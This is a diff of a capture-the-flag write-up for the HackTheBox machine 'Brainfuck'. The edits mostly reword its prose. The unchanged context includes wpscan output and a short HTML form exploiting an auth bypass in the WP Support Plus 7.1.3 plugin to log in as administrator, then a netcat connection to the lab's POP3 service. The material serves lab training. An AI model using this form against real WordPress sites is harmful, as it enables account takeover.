@@ -56,7 +56,7 @@
         },
         "datePublished": "2023-11-03",
         "description": "Writeup for HTB Brainfuck",
-        "wordCount":  1918 ,
+        "wordCount":  1906 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-11-03",
         "image": {
@@ -270,7 +270,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">A1 LOGIN brainfuck brainfuck
 </span></span><span class="line"><span class="cl">A1 NO <span class="o">[</span>AUTHENTICATIONFAILED<span class="o">]</span> Authentication failed.
 </span></span></code></pre></div><h1 id="dns">DNS</h1>
-<p>I added <a href="https://www.brainfuck.htb">www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb, brainfuck.htb to /etc/hots and I found wordpress page and some forum on broser.</p>
+<p>Added <a href="https://www.brainfuck.htb">www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb, and brainfuck.htb to /etc/hosts. Discovered a WordPress site and a forum.</p>
 <h1 id="wordpress">Wordpress</h1>
 <h2 id="wpscan">wpscan</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
@@ -375,20 +375,18 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Data Received: 203.026 KB
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Memory used: 247.551 MB
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Elapsed time: 00:00:06
-</span></span></code></pre></div><p>I found interesting exploit after searching “wp-support-plus-responsive-ticket-system”</p>
+</span></span></code></pre></div><p>Identified WordPress version 4.7.3 and a vulnerable plugin: wp-support-plus-responsive-ticket-system version 7.1.3.</p>
 <p><a href="https://www.exploit-db.com/exploits/41006">WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation</a></p>
-<p>I made HTML file and made a request through it.</p>
+<p>Used a known exploit for the vulnerable plugin to escalate privileges and gain admin access.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://brainfuck.htb/wp-admin/admin-ajax.php&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">	Username: &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;username&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;administrator&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;sth&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;loginGuestFacebook&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;Login&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">&lt;/form&gt;
-</span></span></code></pre></div><p>After redirecting, I got admin cookie.</p>
-<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.32.59.png" alt="Screenshot 2023-11-02 at 16.32.59.png"></p>
-<p>I found smtp credential in wp plugin setting.</p>
+</span></span></code></pre></div><p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.32.59.png" alt="Screenshot 2023-11-02 at 16.32.59.png"></p>
 <p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.33.54.png" alt="Screenshot 2023-11-02 at 16.33.54.png"></p>
-<p>I accessed the pop3 port and logged in with the credential, and found some information.</p>
+<p>Obtained admin credentials and discovered SMTP credentials in the plugin settings.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─# nc 10.129.228.97 <span class="m">110</span>                                                         
 </span></span><span class="line"><span class="cl">+OK Dovecot ready.
